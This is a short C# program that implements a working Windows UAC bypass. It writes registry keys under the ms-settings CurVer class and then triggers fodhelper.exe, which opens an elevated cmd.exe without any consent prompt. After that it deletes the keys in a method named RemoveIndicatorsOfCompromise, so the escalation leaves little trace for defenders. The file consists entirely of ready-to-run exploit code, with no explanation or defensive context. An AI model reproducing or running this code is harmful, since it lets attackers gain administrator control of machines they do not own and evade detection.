using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Principal;

class Phanto
{
    private static String name = ".pht";
    private static String execute = @"cmd.exe";
    
    static void Main(string[] args)
    {
        if (Compromise())
        {
            RemoveIndicatorsOfCompromise();
            Process.Start("cmd.exe");
        }
    }

    static Process CreateProcess(String name)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = name;
        psi.RedirectStandardInput = true;
        psi.RedirectStandardOutput = true;
        psi.CreateNoWindow = true;
        psi.UseShellExecute = false;

        Process process = new Process();
        process.StartInfo = psi;

        return process;
    }

    static bool PrivilegedToken()
    {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }

    static bool Compromise()
    {
        if (PrivilegedToken()) return true;

        Process cmdElevation = CreateProcess("cmd.exe");
        cmdElevation.Start();

        cmdElevation.StandardInput.WriteLine(@"REG ADD HKCU\SOFTWARE\Classes\ms-settings\CurVer /d " + Phanto.name + " /f");
        cmdElevation.StandardInput.WriteLine(@"REG ADD HKCU\SOFTWARE\Classes\" + Phanto.name + @"\Shell\Open\command /d " + Phanto.execute + @" /f & fodhelper.exe");
        
        cmdElevation.StandardInput.Close();

        return false;
    }

    static bool RemoveIndicatorsOfCompromise()
    {
        using (RegistryKey registrykeyHKCU = Registry.CurrentUser)
        {
            registrykeyHKCU.DeleteSubKey(@"SOFTWARE\Classes\ms-settings\CurVer");
            registrykeyHKCU.DeleteSubKeyTree(@"SOFTWARE\Classes\" + Phanto.name);

            return true;
        }
    }
}